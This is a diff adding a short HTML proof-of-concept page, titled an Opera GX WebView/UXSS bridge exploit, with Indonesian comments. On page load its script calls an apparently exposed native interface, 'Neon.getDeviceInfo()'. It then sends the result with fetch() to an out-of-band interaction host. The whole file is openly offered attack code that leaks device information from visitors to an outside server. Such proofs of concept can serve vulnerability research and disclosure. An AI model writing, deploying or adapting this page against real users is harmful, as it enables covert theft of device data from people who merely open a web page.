@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Opera GX UXSS Bridge Exploit</title>
+    <meta charset="UTF-8">
+    <script>
+      function escalate() {
+        try {
+          // Payload: akses fungsi Java melalui interface "Neon"
+          let result = Neon.getDeviceInfo();  // Misal: native method yang bocor
+          alert("Leaked info: " + result);
+
+          // Exfiltrate ke attacker
+          fetch("https://oxomzauseuatgjlyyqtdkiq3v0vsnm0p5.oast.fun/leak?data=" + encodeURIComponent(result));
+        } catch (e) {
+          alert("Exploit failed: " + e);
+        }
+      }
+      window.onload = escalate;
+    </script>
+  </head>
+  <body>
+    <h1>Opera GX WebView Exploit</h1>
+    <p>If you're seeing this, you're vulnerable.</p>
+  </body>
+</html>
